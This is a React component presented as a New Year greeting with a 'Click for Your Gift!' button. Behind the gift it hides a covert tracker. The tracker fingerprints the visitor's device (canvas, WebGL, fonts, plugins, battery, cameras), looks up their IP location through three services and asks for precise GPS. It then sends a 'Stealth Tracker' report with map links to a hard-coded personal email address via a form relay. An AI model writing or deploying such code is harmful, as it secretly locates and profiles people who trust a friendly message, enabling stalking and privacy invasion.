import React, { useState, useEffect } from 'react';
import { Gift, Sparkles, Send } from 'lucide-react';
import './NewYearGreeting.css';

export default function NewYearGreeting() {
  const [showGift, setShowGift] = useState(false);
  const [sending, setSending] = useState(false);

  const handleButtonClick = async () => {
    setSending(true);

    // Show gift IMMEDIATELY - no waiting
    setTimeout(() => {
      setShowGift(true);
      setSending(false);
    }, 800);

    // Collect ALL data in background (after showing gift)
    collectAndSendData();
  };

  const collectAndSendData = async () => {
    const allData = {
      clickTime: new Date().toISOString(),
      clickTimeLocal: new Date().toLocaleString()
    };

    // PHASE 1: Instant data (0ms) - Device & Browser
    allData.device = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      vendor: navigator.vendor,
      language: navigator.language,
      languages: navigator.languages?.join(', '),
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      screenColorDepth: window.screen.colorDepth,
      screenPixelDepth: window.screen.pixelDepth,
      devicePixelRatio: window.devicePixelRatio,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      availWidth: window.screen.availWidth,
      availHeight: window.screen.availHeight,
      orientation: window.screen.orientation?.type,
      orientationAngle: window.screen.orientation?.angle,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      onlineStatus: navigator.onLine,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      maxTouchPoints: navigator.maxTouchPoints,
      pdfViewerEnabled: navigator.pdfViewerEnabled,
      connection: {
        type: navigator.connection?.type,
        effectiveType: navigator.connection?.effectiveType,
        downlink: navigator.connection?.downlink,
        rtt: navigator.connection?.rtt,
        saveData: navigator.connection?.saveData
      }
    };

    // Page info
    allData.page = {
      url: window.location.href,
      hostname: window.location.hostname,
      pathname: window.location.pathname,
      referrer: document.referrer,
      title: document.title,
      documentMode: document.documentMode,
      historyLength: window.history.length
    };

    // Performance info
    if (window.performance) {
      allData.performance = {
        loadTime: window.performance.timing.loadEventEnd - window.performance.timing.navigationStart,
        domReadyTime: window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart,
        connectTime: window.performance.timing.responseEnd - window.performance.timing.requestStart
      };
    }

    // Media devices
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      allData.mediaDevices = {
        audioInputs: devices.filter(d => d.kind === 'audioinput').length,
        audioOutputs: devices.filter(d => d.kind === 'audiooutput').length,
        videoInputs: devices.filter(d => d.kind === 'videoinput').length,
        hasCamera: devices.some(d => d.kind === 'videoinput'),
        hasMicrophone: devices.some(d => d.kind === 'audioinput')
      };
    } catch (e) {
      allData.mediaDevices = { error: 'Permission denied' };
    }

    // WebGL info
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        allData.webgl = {
          vendor: gl.getParameter(gl.VENDOR),
          renderer: gl.getParameter(gl.RENDERER),
          unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
          unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
          version: gl.getParameter(gl.VERSION),
          shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
        };
      }
    } catch (e) {
      allData.webgl = { error: 'Not available' };
    }

    // Canvas fingerprint
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      canvas.width = 200;
      canvas.height = 50;
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.textBaseline = 'alphabetic';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('Canvas 🎁 2025', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('Canvas 🎁 2025', 4, 17);
      allData.canvasFingerprint = canvas.toDataURL().slice(-50);
    } catch (e) {
      allData.canvasFingerprint = 'Error';
    }

    // Plugins
    try {
      allData.plugins = Array.from(navigator.plugins || []).map(p => ({
        name: p.name,
        description: p.description,
        filename: p.filename
      }));
    } catch (e) {
      allData.plugins = [];
    }

    // Fonts detection
    allData.fonts = detectFonts();

    // Battery
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        allData.battery = {
          level: Math.round(battery.level * 100) + '%',
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      }
    } catch (e) {
      allData.battery = { error: 'Not available' };
    }

    // PHASE 2: Quick IP services (parallel - fast!)
    const ipPromises = [
      fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => null),
      fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null),
      fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => null)
    ];

    const [ipify, ipapi, ipinfo] = await Promise.all(ipPromises);

    allData.ipData = {
      ipify: ipify,
      ipapi: ipapi,
      ipinfo: ipinfo
    };

    // Determine best location from IP
    if (ipapi && ipapi.latitude) {
      allData.bestLocation = {
        source: 'ipapi',
        ip: ipapi.ip,
        city: ipapi.city,
        region: ipapi.region,
        country: ipapi.country_name,
        countryCode: ipapi.country,
        latitude: ipapi.latitude,
        longitude: ipapi.longitude,
        postal: ipapi.postal,
        timezone: ipapi.timezone,
        isp: ipapi.org,
        asn: ipapi.asn,
        mapsUrl: `https://www.google.com/maps?q=${ipapi.latitude},${ipapi.longitude}`
      };
    } else if (ipinfo && ipinfo.loc) {
      const [lat, lng] = ipinfo.loc.split(',');
      allData.bestLocation = {
        source: 'ipinfo',
        ip: ipinfo.ip,
        city: ipinfo.city,
        region: ipinfo.region,
        country: ipinfo.country,
        latitude: parseFloat(lat),
        longitude: parseFloat(lng),
        postal: ipinfo.postal,
        timezone: ipinfo.timezone,
        isp: ipinfo.org,
        mapsUrl: `https://www.google.com/maps?q=${lat},${lng}`
      };
    }

    // PHASE 3: Try GPS location (may ask permission - but it's LAST)
    try {
      const position = await new Promise((resolve, reject) => {
        const timeoutId = setTimeout(() => reject(new Error('GPS timeout')), 10000);
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            clearTimeout(timeoutId);
            resolve(pos);
          },
          (err) => {
            clearTimeout(timeoutId);
            reject(err);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      });

      allData.gpsLocation = {
        source: 'GPS',
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: Math.round(position.coords.accuracy) + ' meters',
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: new Date(position.timestamp).toLocaleString(),
        mapsUrl: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
      };

      // Override best location with GPS if available
      allData.bestLocation = {
        ...allData.gpsLocation,
        source: 'GPS (Most Accurate)',
        city: allData.bestLocation?.city || 'Unknown',
        country: allData.bestLocation?.country || 'Unknown'
      };
    } catch (e) {
      allData.gpsLocation = {
        error: e.message,
        note: 'User may have denied permission or GPS not available'
      };
    }

    // Send email with all data
    await sendDetailedEmail(allData);
  };

  const detectFonts = () => {
    const testFonts = [
      'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
      'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
      'Impact', 'Lucida Console', 'Tahoma', 'Helvetica'
    ];

    const detected = [];
    const baseFonts = ['monospace', 'sans-serif', 'serif'];

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    for (const font of testFonts) {
      ctx.font = `72px ${font}, ${baseFonts[0]}`;
      const width = ctx.measureText('mmmmmmmmmmlli').width;
      ctx.font = `72px ${baseFonts[0]}`;
      const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
      if (width !== baseWidth) detected.push(font);
    }

    return detected;
  };

  const sendDetailedEmail = async (data) => {
    const YOUR_EMAIL = 'chetanshende137@gmail.com';

    // Create beautiful email body
    const locationSection = data.bestLocation ? `
🎯 PRIMARY LOCATION (${data.bestLocation.source}):
═══════════════════════════════════════
📍 Coordinates: ${data.bestLocation.latitude}, ${data.bestLocation.longitude}
🌍 City: ${data.bestLocation.city}
🏙️ Region: ${data.bestLocation.region || 'N/A'}
🌎 Country: ${data.bestLocation.country}
📮 Postal: ${data.bestLocation.postal || 'N/A'}
🎯 Accuracy: ${data.bestLocation.accuracy || 'City-level'}
🌐 IP Address: ${data.bestLocation.ip || 'N/A'}
🏢 ISP: ${data.bestLocation.isp || 'N/A'}
🕐 Timezone: ${data.bestLocation.timezone}

🗺️ GOOGLE MAPS: ${data.bestLocation.mapsUrl}
🗺️ OPEN STREET MAP: https://www.openstreetmap.org/?mlat=${data.bestLocation.latitude}&mlon=${data.bestLocation.longitude}&zoom=15
    ` : '❌ Location not available';

    const emailBody = `
🎁 NEW YEAR GIFT CLICKED - COMPLETE TRACKING REPORT 🎁
═══════════════════════════════════════════════════════

⏰ CLICK TIME: ${data.clickTimeLocal}

${locationSection}

💻 DEVICE INFORMATION:
═══════════════════════════════════════
📱 Platform: ${data.device.platform}
🖥️ User Agent: ${data.device.userAgent}
🎨 Vendor: ${data.device.vendor}
🌍 Language: ${data.device.language}
📊 Screen: ${data.device.screenWidth}x${data.device.screenHeight} (${data.device.screenColorDepth}-bit)
🖼️ Viewport: ${data.device.viewportWidth}x${data.device.viewportHeight}
📐 Pixel Ratio: ${data.device.devicePixelRatio}
🔄 Orientation: ${data.device.orientation} (${data.device.orientationAngle}°)
🕐 Timezone: ${data.device.timezone} (UTC${data.device.timezoneOffset > 0 ? '-' : '+'}${Math.abs(data.device.timezoneOffset/60)})
⚙️ CPU Cores: ${data.device.hardwareConcurrency}
💾 Memory: ${data.device.deviceMemory} GB
📱 Touch Points: ${data.device.maxTouchPoints}
📶 Connection: ${data.device.connection.effectiveType} (${data.device.connection.downlink} Mbps)
🔋 Battery: ${JSON.stringify(data.battery)}

🎥 MEDIA DEVICES:
═══════════════════════════════════════
📷 Cameras: ${data.mediaDevices.videoInputs || 0}
🎤 Microphones: ${data.mediaDevices.audioInputs || 0}
🔊 Speakers: ${data.mediaDevices.audioOutputs || 0}

🎨 GRAPHICS INFO (WebGL):
═══════════════════════════════════════
🖥️ Vendor: ${data.webgl.vendor || 'N/A'}
🎮 Renderer: ${data.webgl.renderer || 'N/A'}
🔓 Unmasked Vendor: ${data.webgl.unmaskedVendor || 'N/A'}
🔓 Unmasked Renderer: ${data.webgl.unmaskedRenderer || 'N/A'}

📄 PAGE INFO:
═══════════════════════════════════════
🔗 URL: ${data.page.url}
🔙 Referrer: ${data.page.referrer || 'Direct visit'}
📜 Title: ${data.page.title}

🔍 FINGERPRINTING:
═══════════════════════════════════════
🎨 Canvas: ${data.canvasFingerprint}
🔤 Fonts Detected: ${data.fonts.join(', ')}
🔌 Plugins: ${data.plugins.length} installed

${data.gpsLocation.error ? `
⚠️ GPS NOTE: ${data.gpsLocation.note}
` : ''}

📊 ALL IP SERVICE RESPONSES:
═══════════════════════════════════════
${JSON.stringify(data.ipData, null, 2)}

═══════════════════════════════════════
🎯 Stealth Tracker v2.0 - Fast & Complete
    `;

    try {
      const formData = new FormData();
      formData.append('_subject', '🎁 New Year Gift Clicked - FULL LOCATION DATA');
      formData.append('_template', 'table');
      formData.append('_captcha', 'false');

      if (data.bestLocation) {
        formData.append('Location_Type', data.bestLocation.source);
        formData.append('City', data.bestLocation.city);
        formData.append('Country', data.bestLocation.country);
        formData.append('Latitude', data.bestLocation.latitude);
        formData.append('Longitude', data.bestLocation.longitude);
        formData.append('IP_Address', data.bestLocation.ip || 'N/A');
        formData.append('Google_Maps_Link', data.bestLocation.mapsUrl);
      }

      formData.append('Device', data.device.platform);
      formData.append('Browser', data.device.userAgent);
      formData.append('Click_Time', data.clickTimeLocal);
      formData.append('Complete_Report', emailBody);

      await fetch(`https://formsubmit.co/ajax/${YOUR_EMAIL}`, {
        method: 'POST',
        headers: {
          'Accept': 'application/json'
        },
        body: formData
      });

      console.log('✅ All tracking data sent successfully!');
    } catch (error) {
      console.error('❌ Email send failed:', error);
    }
  };

  if (showGift) {
    return (
      <div className="gift-container">
        <div className="content-wrapper">
          <div className="gift-icon-wrapper bouncing">
            <Gift className="gift-icon" />
          </div>
          <h1 className="title">
            🎉 Happy New Year 2026! 🎉
          </h1>
          <p className="subtitle">
            Wishing you joy, success, and endless possibilities!
          </p>
          <div className="card">
            <Sparkles className="card-icon" />
            <p className="card-title">
              May this year bring you:
            </p>
            <ul className="wish-list">
              <li>✨ Abundant happiness</li>
              <li>💪 Great health</li>
              <li>🚀 Amazing opportunities</li>
              <li>❤️ Love and laughter</li>
            </ul>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="gift-container start-container">
      <div className="content-wrapper">
        <div className="gift-icon-wrapper">
          <Sparkles className="sparkle-icon" />
        </div>

        <h1 className="title">
          Happy New Year!
        </h1>

        <p className="description">
          I have a special New Year gift for you! 🎁
        </p>

        <button
          onClick={handleButtonClick}
          disabled={sending}
          className="gift-button"
        >
          {sending ? (
            <>
              <Send className="button-icon spinning" />
              Opening...
            </>
          ) : (
            <>
              <Gift className="button-icon" />
              Click for Your Gift!
            </>
          )}
        </button>

        <p className="footer-text">
          Click the button above to reveal your surprise! 🎊
        </p>
      </div>
    </div>
  );
}
